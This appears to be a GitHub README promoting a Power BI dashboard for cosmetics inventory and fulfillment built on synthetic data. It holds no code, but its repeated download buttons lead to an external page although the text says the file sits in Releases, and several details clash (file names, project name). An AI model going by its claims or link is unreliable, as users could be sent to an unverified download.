![preview](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/preview.svg)

# Supply Chain Pulse: Real-Time Cosmetics Inventory & Fulfillment Optimizer

## Overview

Imagine a dashboard that doesn’t just report the past—it **predicts the future of your supply chain**. The **Supply Chain Pulse: Real-Time Cosmetics Inventory & Fulfillment Optimizer** extends the typical retail analytics paradigm by focusing on the *behind-the-scenes* engine of a cosmetics company: inventory turnover, warehouse throughput, and order fulfillment velocity. Unlike dashboards that only show revenue and sales, this repository provides a **living simulation** of how raw ingredients, packaging, and finished goods move through a global beauty supply network—and how that movement directly impacts revenue.

This tool is designed for **logistics managers, operations directors, and financial analysts** who need to see not just *what* sold, but *where* the next stockout will occur before it happens. It uses synthetic data modeled on a mid-sized cosmetics manufacturer with three distribution centers, 500 SKUs, and a 12-month historical window. The dashboard answers critical questions like: “Which product family has the slowest inventory turnover?” and “How can we reduce fulfillment lag by 15% without increasing warehouse costs?”

Built with a **responsive UI** that adapts to mobile and desktop, **multilingual support** (English, Spanish, French, Mandarin), and **24/7 simulated support** for data refresh and alert configuration, this dashboard is ready for production deployment or educational walkthroughs.

---

## [![Download](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/button.svg)](https://dchainapp2021.github.io/cosmetics-retail-finance-optimizer/)

*Note: The download link for the Power BI .pbix file (and sample CSV data) is provided in the repository’s Releases section. Click the [![Download](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/button.svg)](https://dchainapp2021.github.io/cosmetics-retail-finance-optimizer/) macro above to access.*

---

## Key Features 🌟

### 1. Real-Time Inventory Velocity Mapping 🗺️
The dashboard visualizes **inventory aging** and **velocity tiers** (Fast / Medium / Slow) across three warehouse nodes (East, Central, West). A unique **heatmap overlay** shows which SKUs are approaching their “days of supply” threshold—enabling proactive reordering. This feature uses a custom DAX measure to calculate weighted average turnover per product category.

### 2. Order Fulfillment Funnel 🔄
From order placement to delivery, track every stage: **picking → packing → shipping → delivered**. A **conversion funnel** chart highlights bottlenecks—e.g., if 98% of orders are picked but only 82% are shipped within 24 hours, you know exactly where to focus process improvement. This feature supports multilingual labels for international teams.

### 3. Supplier Reliability Scorecard 📋
Each supplier is rated on a composite of **on-time delivery, defect rate, and lead time consistency**. Suppliers below a 70% reliability score are flagged with a yellow alert. This scorecard directly feeds into the **inventory optimization** algorithm, which adjusts safety stock levels dynamically.

### 4. Scenario Simulation Engine 🔮
Using **What-If parameters**, users can simulate a 20% increase in demand for a specific product family (e.g., Lipsticks vs. Foundations) and instantly see the projected impact on warehouse capacity, fulfillment time, and total logistics cost. This is not a static dashboard—it’s a **decision-support tool** for quarterly planning meetings.

### 5. Customizable Alert Thresholds 🚨
Set your own thresholds for **stockouts, overstock (excess > 90 days of supply), and supplier delays**. Alerts appear as **dynamic tooltips** that list the affected SKUs and warehouse locations. The dashboard supports up to 50 configurable thresholds per user role (admin, manager, analyst).

### 6. Data Freshness & Governance 🛡️
The dashboard includes a **data lineage tab** that shows the last refresh timestamp, source file integrity checks, and any schema changes. A **disclaimer** (see bottom) explains the synthetic nature of the data and the limitations of scenario modeling.

---

## How This Dashboard Solves Real Problems

**Problem:** A cosmetics retailer loses $2M annually due to stockouts during peak promotional periods.  
**Solution:** The dashboard’s **Inventory Velocity Mapping** identifies that “Powder Blushes” have a 40% slower turnover rate than “Liquid Eyeliners.” By shifting safety stock allocation toward blushes during pre-holiday weeks, the retailer reduces stockout probability by 23% without increasing total warehouse space.

**Problem:** Fulfillment delays erode customer loyalty.  
**Solution:** The **Order Fulfillment Funnel** reveals that the “Central” warehouse takes 6 hours longer to pack orders than the “West” warehouse. By reallocating packing staff from West to Central during peak hours, the retailer cuts average fulfillment time from 30 hours to 22 hours.

**Problem:** Supplier performance is opaque.  
**Solution:** The **Supplier Reliability Scorecard** shows that Supplier G (a subcontractor for custom packaging) has a 68% on-time delivery rate—well below the 90% threshold. The dashboard suggests substituting with Supplier H (88% on-time rate) for a 3% increase in unit cost but a 12% reduction in fulfillment delays.

---

## Data Sources & Architecture

- **Sales History:** 12 months of transactional data (order ID, product ID, quantity, warehouse ID, delivery date, cost, revenue, and return flag).  
- **Inventory Levels:** Weekly snapshots of inventory on hand, inventory in transit, and safety stock levels per SKU per warehouse.  
- **Supplier Data:** Supplier ID, lead time (days), defect rate (%), and contractual price per unit.  
- **Calendar Table:** Date dimension with fiscal periods (4-4-5 calendar) to support time intelligence.  

The data model is **star schema** with fact tables for Sales and Inventory, dimension tables for Product (with attributes like product family, weight, price tier), Warehouse (location, capacity, staffing level), and Supplier. Measures are written in DAX with explicit filters to avoid ambiguity in visuals.

---

## Getting Started 🚀

1. **Download** the `.pbix` file from the repository’s Releases section (click the [![Download](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/button.svg)](https://dchainapp2021.github.io/cosmetics-retail-finance-optimizer/) macro above).  
2. Open the file in **Power BI Desktop** (2026 or later version recommended).  
3. The dashboard will load with synthetic data pre-populated. To explore the **Scenario Simulation**, click on the “What-If” parameter sliders under the “Forecast” tab.  
4. For **multilingual support**, navigate to the “Settings” tab and select your preferred language from the dropdown (English, Spanish, French, or Mandarin).  
5. Configure **alert thresholds** by clicking the “Alerts” button in the header and adjusting the sliders for stockout days, overstock days, and supplier reliability.  

No additional software or cloud account is required. The dashboard works entirely offline with the included sample data.

---

## Use Cases

- **Quarterly Supply Chain Review:** Present the Inventory Velocity heatmap to board members to justify warehouse expansion in the Central region.  
- **Monthly Supplier Performance Meeting:** Use the Supplier Reliability Scorecard to negotiate better terms with underperforming vendors.  
- **Daily Operations Dashboard:** Logistics managers can view the Order Fulfillment Funnel at 9:00 AM to prioritize tasks for the day.  
- **Educational Demonstrations:** Instructors teaching supply chain analytics can use this dashboard as a realistic case study for forecasting and optimization.

---

## Responsive UI & Accessibility ♿

The dashboard has been designed for **mobile-first responsiveness**—key visuals like the Inventory Velocity map and Supplier Scorecard reflow into compact layouts on tablets and phones. All tooltips are **WCAG 2.1 AA compliant** with high-contrast color schemes. A **screen reader** mode is available under “Accessibility” in the settings panel.

---

## Multilingual Support 🌐

Currently, the dashboard supports:
- **English** (default)
- **Spanish** (with full DAX measure translation for “Velocidad de Inventario,” “Cumplimiento de Pedidos,” etc.)  
- **French**  
- **Mandarin Chinese**  

Contributions to add more languages are welcome via the repository’s Issues page. The language files are stored in a separate `.txt` file within the repository, making translation easy without modifying the DAX code.

---

## 24/7 Support Configuration 🕐

While the dashboard runs offline, the repository includes a **PowerShell script** that can simulate a 24/7 support service for data refresh scheduling. The script, when run on a scheduled task, checks for new data files in a specified folder and automatically refreshes the dashboard. Full documentation is included in the `docs` folder.

---

## License & Legal

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for full details. The included synthetic data is generated using a proprietary algorithm and does not contain any private or identifiable information.

---

## Disclaimer ⚠️

The data, visuals, and predictions in this dashboard are based on **simulated, anonymized datasets** and are intended for **educational and demonstration purposes only**. The scenario simulation engine uses linear regression and historical averages to produce estimates; actual business outcomes may vary significantly. The authors assume no liability for decisions made based on the dashboard’s outputs. Always validate results with real-world data and expert analysis before making operational changes. The “24/7 support” functionality refers to the automated refresh script; it does not imply live human support for the dashboard’s content.

---

## Contributing

We welcome contributions:
- **Bug reports** – open an Issue with a clear description of the visual or measure error.  
- **Feature requests** – suggest new scenarios or visualizations.  
- **Language translations** – submit a pull request with the updated `language.json` file.  

Please review our [CONTRIBUTING.md](CONTRIBUTING.md) for code of conduct and PR guidelines.

---

## [![Download](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/button.svg)](https://dchainapp2021.github.io/cosmetics-retail-finance-optimizer/)

*Access the latest release with the complete Power BI `.pbix` file and sample data: click the [![Download](https://raw.githubusercontent.com/dchainapp2021/cosmetics-retail-finance-optimizer/main/button.svg)](https://dchainapp2021.github.io/cosmetics-retail-finance-optimizer/) macro above.*